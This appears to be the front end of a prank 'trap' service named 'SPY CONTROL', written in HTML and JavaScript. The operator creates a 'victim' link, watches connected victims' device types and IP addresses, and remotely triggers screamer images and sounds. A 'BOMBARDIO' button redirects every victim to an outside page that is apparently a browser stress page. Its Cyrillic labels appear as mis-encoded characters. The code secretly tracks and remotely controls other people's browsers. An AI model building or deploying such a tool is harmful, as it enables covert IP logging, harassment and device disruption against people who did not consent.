<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SPY CONTROL v11.0 (URL)</title>
    <style>
        :root {
            --neon: #00ffcc;
            --neon-secondary: #00aaff;
            --danger: #ff3366;
            --bg-dark: #050507;
            --card-bg: rgba(20, 20, 25, 0.95);
            --text-color: #e0e0e0;
        }
        body { 
            background-color: var(--bg-dark); color: var(--text-color); 
            font-family: 'Segoe UI', Roboto, sans-serif; 
            margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center;
            background: radial-gradient(ellipse at bottom, #1B2735 0%, #090A0F 100%);
            overflow: hidden;
        }

        .container { 
            position: relative; z-index: 1; width: 95%; max-width: 500px; 
            background: var(--card-bg); padding: 25px 20px; border-radius: 20px; 
            border: 1px solid rgba(0, 255, 204, 0.15);
            backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px);
            box-shadow: 0 0 30px rgba(0,0,0,0.6);
            max-height: 98vh; overflow-y: auto;
            display: flex; flex-direction: column;
        }

        /* HEADER */
        h1 { font-size: 24px; text-transform: uppercase; text-align: center; color: var(--neon); letter-spacing: 3px; margin: 10px 0 25px 0; text-shadow: 0 0 10px rgba(0,255,204,0.3); }

        .lang-bar { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; }
        .lang-btn { background: rgba(255,255,255,0.05); border: 1px solid #444; color: #888; padding: 4px 12px; border-radius: 6px; cursor: pointer; font-size: 10px; transition: 0.2s; }
        .lang-btn.active { border-color: var(--neon); color: black; background: var(--neon); font-weight: bold; }

        /* INPUTS */
        .input-box { background: rgba(0,0,0,0.3); padding: 15px; border-radius: 12px; margin-bottom: 15px; border: 1px solid #333; position: relative; transition: 0.3s; }
        .input-box:focus-within { border-color: var(--neon-secondary); box-shadow: 0 0 10px rgba(0, 170, 255, 0.1); }
        
        .lbl-title { font-size: 10px; font-weight: bold; color: var(--neon-secondary); display: block; margin-bottom: 8px; letter-spacing: 1px; }

        input[type="text"] { 
            width: 100%; padding: 12px; background: #0b0b0b; border: 1px solid #333; 
            color: white; border-radius: 8px; box-sizing: border-box; font-size: 13px; outline: none; transition: 0.2s;
        }
        input[type="text"]:focus { border-color: var(--neon); background: #111; }

        /* SOUND MENU */
        .input-wrapper { display: flex; gap: 8px; align-items: center; position: relative; }
        .input-wrapper input { flex-grow: 1; }

        .sound-menu-btn { 
            background: #111; border: 1px solid #333; color: var(--neon-secondary); 
            border-radius: 8px; width: 44px; height: 42px; display: flex; justify-content: center; align-items: center; 
            cursor: pointer; font-size: 18px; transition: 0.2s;
        }
        .sound-menu-btn:hover { border-color: var(--neon); background: rgba(0,255,204,0.1); color: var(--neon); }

        .sound-dropdown { 
            display: none; position: absolute; top: 50px; right: 0; width: 100%; 
            background: #121212; border: 1px solid var(--neon-secondary); border-radius: 10px; 
            z-index: 1000; max-height: 250px; overflow-y: auto; box-shadow: 0 10px 30px rgba(0,0,0,0.9); 
        }
        .sound-dropdown.show { display: block; animation: fadeIn 0.2s ease-out; }
        
        .sound-item { 
            padding: 12px; border-bottom: 1px solid #222; font-size: 12px; cursor: pointer; 
            color: #ccc; display: flex; justify-content: space-between; align-items: center; 
        }
        .sound-item:hover { background: var(--neon-secondary); color: black; }
        .preview-btn { 
            font-size: 10px; padding: 4px 8px; border: 1px solid #555; background: black; color: white; 
            margin-left: 10px; cursor: pointer; border-radius: 4px;
        }

        /* BUTTONS */
        button.main-btn { 
            width: 100%; padding: 15px; border: none; border-radius: 10px; font-weight: bold; 
            cursor: pointer; text-transform: uppercase; margin-top: 10px; font-size: 13px; letter-spacing: 1px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3); transition: 0.2s;
        }
        .btn-create { background: var(--neon); color: #050507; }
        .btn-create:hover { background: #00e6b8; box-shadow: 0 0 20px var(--neon); }
        .btn-create:active { transform: scale(0.98); }

        .btn-update { background: transparent; color: var(--neon); border: 1px solid var(--neon); margin-top: 15px; }
        .btn-update:hover { background: rgba(0,255,204,0.1); }
        
        .btn-scare { background: #222; color: #555; height: 55px; font-size: 16px; cursor: not-allowed; margin-top: 20px; border: 1px solid #333; }
        .btn-scare.ready { background: var(--danger); color: white; cursor: pointer; animation: pulse 2s infinite; border: none; }
        
        .btn-bomb { 
            background: repeating-linear-gradient(45deg, #111, #111 10px, #400 10px, #400 20px); 
            color: var(--danger); border: 2px solid var(--danger); margin-top: 10px; height: 45px; 
            cursor: not-allowed; opacity: 0.5; font-size: 12px;
        }
        .btn-bomb.ready { cursor: pointer; opacity: 1; }
        
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.02); } 100% { transform: scale(1); } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }

        .link-box { background: #000; padding: 12px; border-radius: 8px; border: 1px dashed #444; margin: 15px 0; word-break: break-all; font-size: 12px; text-align: center;}
        
        .history-item { 
            display: flex; justify-content: space-between; align-items: center;
            background: #111; padding: 10px; border-radius: 8px; margin-bottom: 5px; cursor: pointer; font-size: 11px; border: 1px solid #222; transition: 0.2s;
        }
        .history-item:hover { border-color: var(--neon); background: #161616; }
        .del-btn { color: var(--danger); background: rgba(255,50,100,0.1); border: 1px solid rgba(255,50,100,0.3); padding: 4px 10px; border-radius: 5px; cursor: pointer;}
        
        /* Scrollbar */
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="lang-bar">
            <button class="lang-btn" onclick="setLang('uk')">UA</button>
            <button class="lang-btn" onclick="setLang('ru')">RU</button>
            <button class="lang-btn" onclick="setLang('en')">EN</button>
        </div>

        <h1 id="txt-title">üëÅÔ∏è SPY CONTROL</h1>

        <div id="setup-step">
            <div class="input-box">
                <span class="lbl-title" id="lbl-img">–ó–û–ë–†–ê–ñ–ï–ù–ù–Ø (URL)</span>
                <input type="text" id="imgUrl" placeholder="https://i.imgur.com/example.jpg">
            </div>

            <div class="input-box">
                <span class="lbl-title" id="lbl-snd">–ó–í–£–ö (URL)</span>
                <div class="input-wrapper">
                    <input type="text" id="sndUrl" value="https://soundbible.com/grab.php?id=1549&type=mp3">
                    <div class="sound-menu-btn" onclick="toggleMenu('create')">‚ò∞</div>
                    <div id="menu-create" class="sound-dropdown"></div>
                </div>
            </div>

            <button class="main-btn btn-create" onclick="handleCreate()" id="btn-create">–°–¢–í–û–†–ò–¢–ò –ü–ê–°–¢–ö–£</button>
        </div>

        <div id="control-panel" style="display:none;">
            <div style="text-align:center; margin:10px 0; font-size:11px; padding:10px;">
                <a id="victim-link" href="#" target="_blank" style="color:var(--neon-secondary); text-decoration:none; font-size:14px; border-bottom:1px solid var(--neon-secondary);">Link...</a>
            </div>
            
            <div class="input-box" style="border-color: var(--neon);">
                <span class="lbl-title" id="lbl-upd" style="color:var(--neon)">–û–ù–û–í–ò–¢–ò –ö–û–ù–¢–ï–ù–¢ (Live)</span>
                <input type="text" id="updImgUrl" placeholder="New Image URL" style="margin-bottom: 10px;">
                <div class="input-wrapper">
                    <input type="text" id="updSndUrl" placeholder="New Sound URL">
                    <div class="sound-menu-btn" onclick="toggleMenu('update')">‚ò∞</div>
                    <div id="menu-update" class="sound-dropdown"></div>
                </div>
                <button class="main-btn btn-update" onclick="handleUpdate()" id="btn-update">–û–ù–û–í–ò–¢–ò</button>
            </div>

            <div id="users-list" style="min-height: 20px; text-align:center; margin-bottom:10px;"></div>
            
            <button id="scare-btn" class="main-btn btn-scare" onclick="triggerScare()" disabled>SCREAMER üíÄ</button>
            <button id="bomb-btn" class="main-btn btn-bomb" onclick="triggerBomb()" disabled>‚ò¢Ô∏è BOMBARDIO ‚ò¢Ô∏è</button>
            
            <button onclick="location.reload()" style="background:transparent; color:#666; border:none; margin-top:20px; width:100%; font-size:11px; cursor:pointer;">‚¨Ö MENU</button>
        </div>

        <div id="history-panel">
            <h3 id="txt-hist" style="font-size:11px; color:#444; margin-top:25px; border-top:1px solid #222; padding-top:10px; text-align:center;">–Ü–°–¢–û–†–Ü–Ø / HISTORY</h3>
            <div id="history-list"></div>
        </div>
    </div>

    <audio id="preview-audio"></audio>
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let curSess = null;
        
        // --- TRANSLATIONS ---
        const i18n = {
            uk: { t:"üëÅÔ∏è SPY CONTROL", li:"–ó–û–ë–†–ê–ñ–ï–ù–ù–Ø (URL)", ls:"–ó–í–£–ö (URL)", bc:"–°–¢–í–û–†–ò–¢–ò –ü–ê–°–¢–ö–£", bu:"–û–ù–û–í–ò–¢–ò –ó–ê–†–ê–ó", lu:"–û–ù–û–í–ò–¢–ò –ö–û–ù–¢–ï–ù–¢ (Live)", bs:"–ù–ê–õ–Ø–ö–ê–¢–ò üíÄ", bb:"‚ò¢Ô∏è –ë–û–ú–ë–ê–†–î–£–í–ê–ù–ù–Ø ‚ò¢Ô∏è", h:"–Ü–°–¢–û–†–Ü–Ø", warn:"‚ö†Ô∏è –£–í–ê–ì–ê! –í—Å—ñ—Ö –ø–µ—Ä–µ–∫–∏–Ω–µ –Ω–∞ –ø—Ä–∞–Ω–∫ —Å–∞–π—Ç!", ln:"üöÄ –ó–ê–ü–£–©–ï–ù–û!" },
            ru: { t:"üëÅÔ∏è –®–ü–ò–û–ù –ö–û–ù–¢–†–û–õ–¨", li:"–ò–ó–û–ë–†–ê–ñ–ï–ù–ò–ï (URL)", ls:"–ó–í–£–ö (URL)", bc:"–°–û–ó–î–ê–¢–¨ –õ–û–í–£–®–ö–£", bu:"–û–ë–ù–û–í–ò–¢–¨ –°–ï–ô–ß–ê–°", lu:"–û–ë–ù–û–í–ò–¢–¨ –ö–û–ù–¢–ï–ù–¢ (Live)", bs:"–ù–ê–ü–£–ì–ê–¢–¨ üíÄ", bb:"‚ò¢Ô∏è –ë–û–ú–ë–ê–†–î–ò–†–û–í–ö–ê ‚ò¢Ô∏è", h:"–ò–°–¢–û–†–ò–Ø", warn:"‚ö†Ô∏è –í–ù–ò–ú–ê–ù–ò–ï! –í—Å–µ—Ö –ø–µ—Ä–µ–∫–∏–Ω–µ—Ç –Ω–∞ –ø—Ä–∞–Ω–∫ —Å–∞–π—Ç!", ln:"üöÄ –ó–ê–ü–£–©–ï–ù–û!" },
            en: { t:"üëÅÔ∏è SPY CONTROL", li:"IMAGE URL", ls:"SOUND URL", bc:"CREATE TRAP", bu:"UPDATE NOW", lu:"LIVE UPDATE", bs:"SCREAMER üíÄ", bb:"‚ò¢Ô∏è BOMBARDIO ‚ò¢Ô∏è", h:"HISTORY", warn:"‚ö†Ô∏è Redirect everyone?", ln:"üöÄ LAUNCHED!" }
        };
        let lang = 'uk';

        function setLang(l) {
            lang = l;
            const t = i18n[l];
            document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('active'));
            document.getElementById('txt-title').innerText = t.t;
            document.getElementById('lbl-img').innerText = t.li;
            document.getElementById('lbl-snd').innerText = t.ls;
            document.getElementById('btn-create').innerText = t.bc;
            document.getElementById('lbl-upd').innerText = t.lu;
            document.getElementById('btn-update').innerText = t.bu;
            if(!document.getElementById('scare-btn').disabled) document.getElementById('scare-btn').innerText = t.bs;
            document.getElementById('bomb-btn').innerText = t.bb;
            document.getElementById('txt-hist').innerText = t.h;
        }

        // --- SOUNDS ---
        const sounds = [
            {n:"–°–∞—Ñ–æ–Ω–æ–≤ –û–ø–ª–∞—Ç–∏—Ç—å", u:"https://www.myinstants.com/media/sounds/safonov-oplatit.mp3"},
            {n:"–ß—É–≥—É–Ω", u:"https://www.myinstants.com/media/sounds/chugun.mp3"},
            {n:"–ö—Ä—è–∫–∞–ª–∫–∞ –î–ü–°", u:"https://www.myinstants.com/media/sounds/kriakalka-dps-no-2.mp3"},
            {n:"–Å–ë*–´–ô –í –†–û–û–¢", u:"https://www.myinstants.com/media/sounds/iobanyi-v-rot.mp3"},
            {n:"Screamer 1", u:"https://www.myinstants.com/media/sounds/scream_horror1.mp3"},
            {n:"–í–∏–∑–≥ —Å–≤–∏–Ω—å–∏", u:"https://www.myinstants.com/media/sounds/vizg-svini.mp3"},
            {n:"–ü–æ–ª–∏—Ü–∏—è", u:"https://www.myinstants.com/media/sounds/police-siren.mp3"},
            {n:"–°—Ç—É–∫ –≤ –¥–≤–µ—Ä—å", u:"https://www.myinstants.com/media/sounds/knocking-on-door.mp3"}
        ];

        function renderMenus() {
            ['create', 'update'].forEach(t => {
                const c = document.getElementById(`menu-${t}`);
                const inp = t==='create'?'sndUrl':'updSndUrl';
                c.innerHTML = sounds.map(s => `
                    <div class="sound-item">
                        <span onclick="pickSound('${inp}','${s.u}','menu-${t}')" style="flex:1">${s.n}</span>
                        <button class="preview-btn" onclick="playP('${s.u}', event)">‚ñ∂</button>
                    </div>`).join('');
            });
        }
        function pickSound(id, url, mid) { document.getElementById(id).value = url; document.getElementById(mid).classList.remove('show'); }
        function toggleMenu(t) { 
            const m = document.getElementById(`menu-${t}`);
            const s = m.classList.contains('show');
            document.querySelectorAll('.sound-dropdown').forEach(e=>e.classList.remove('show'));
            if(!s) m.classList.add('show');
        }
        function playP(u, e) { e.stopPropagation(); const a = document.getElementById('preview-audio'); a.src=u; a.volume=0.5; a.play(); }
        window.onclick = e => { if(!e.target.closest('.sound-menu-btn') && !e.target.closest('.preview-btn')) document.querySelectorAll('.sound-dropdown').forEach(m=>m.classList.remove('show')); };

        // --- CORE LOGIC (JSON Only - Fast & Simple) ---
        async function handleCreate() {
            const img = document.getElementById('imgUrl').value;
            const snd = document.getElementById('sndUrl').value;
            
            // –ü—Ä–æ—Å—Ç–∞—è –≤–∞–ª–∏–¥–∞—Ü–∏—è
            if(!img && !snd) return alert("–í–≤–µ–¥–∏—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ —Ñ–æ—Ç–æ –∏–ª–∏ –∑–≤—É–∫!");

            try {
                const r = await fetch('/create', {
                    method:'POST',
                    headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({image:img, sound:snd})
                });
                const d = await r.json();
                activate(d.id, d.shortUrl);
            } catch(e) { alert("Error: "+e); }
        }

        async function handleUpdate() {
            if(!curSess) return;
            const iu = document.getElementById('updImgUrl').value;
            const su = document.getElementById('updSndUrl').value;

            try {
                await fetch(`/update-session/${curSess}`, {
                    method:'POST',
                    headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({image:iu, sound:su})
                });
                alert("UPDATED OK!");
                document.getElementById('updImgUrl').value=''; 
                document.getElementById('updSndUrl').value='';
            } catch(e) { alert("Error: "+e); }
        }

        function activate(id, shortCode) {
            curSess = id;
            saveH(id);
            document.getElementById('setup-step').style.display='none';
            document.getElementById('control-panel').style.display='block';
            document.getElementById('history-panel').style.display='none';
            
            const l = shortCode ? `${window.location.origin}/${shortCode}` : `${window.location.origin}/victim.html?id=${id}`;
            const lel = document.getElementById('victim-link');
            lel.href = l;
            lel.innerText = l;
            
            socket.emit('join-room-admin', id);
        }

        function triggerScare() { if(curSess) socket.emit('trigger-scare', curSess); }
        function triggerBomb() { 
            if(curSess && confirm(i18n[lang].warn)) {
                socket.emit('trigger-redirect', {roomId:curSess, url:"https://prank-nfc.onrender.com/volumeshader_bm.html"});
                alert(i18n[lang].ln);
            }
        }

        socket.on('update-victim-list', u => {
            const b = document.getElementById('scare-btn');
            const bb = document.getElementById('bomb-btn');
            const l = document.getElementById('users-list');
            if(u.length){
                b.disabled=false; b.classList.add('ready'); b.innerText = i18n[lang].bs;
                bb.disabled=false; bb.classList.add('ready');
                l.innerHTML = u.map(v=>`<div style="color:var(--neon);font-size:11px;border-bottom:1px solid #222;padding:5px;">‚óè ${v.device} [${v.ip}]</div>`).join('');
            } else {
                b.disabled=true; b.classList.remove('ready');
                bb.disabled=true; bb.classList.remove('ready');
                l.innerHTML='<div style="color:#555;font-size:11px;padding:10px;">Waiting for victims...</div>';
            }
        });

        // --- HISTORY ---
        function saveH(id){ let h=JSON.parse(localStorage.getItem('sh')||'[]'); if(!h.includes(id)){h.unshift(id); localStorage.setItem('sh',JSON.stringify(h.slice(0,10)));} }
        function loadH(){ 
            const h=JSON.parse(localStorage.getItem('sh')||'[]');
            const l=document.getElementById('history-list'); l.innerHTML='';
            h.forEach(id=>{
                const d=document.createElement('div'); d.className='history-item';
                d.innerHTML=`<span style="flex:1" onclick="activate('${id}')">ID: ${id.slice(0,8)}...</span><button class="del-btn" onclick="delH('${id}',event)">‚úï</button>`;
                l.appendChild(d);
            });
        }
        function delH(id,e){ e.stopPropagation(); let h=JSON.parse(localStorage.getItem('sh')||'[]'); h=h.filter(i=>i!==id); localStorage.setItem('sh',JSON.stringify(h)); loadH(); }

        window.onload = () => { loadH(); renderMenus(); setLang('uk'); };
    </script>
</body>
</html>
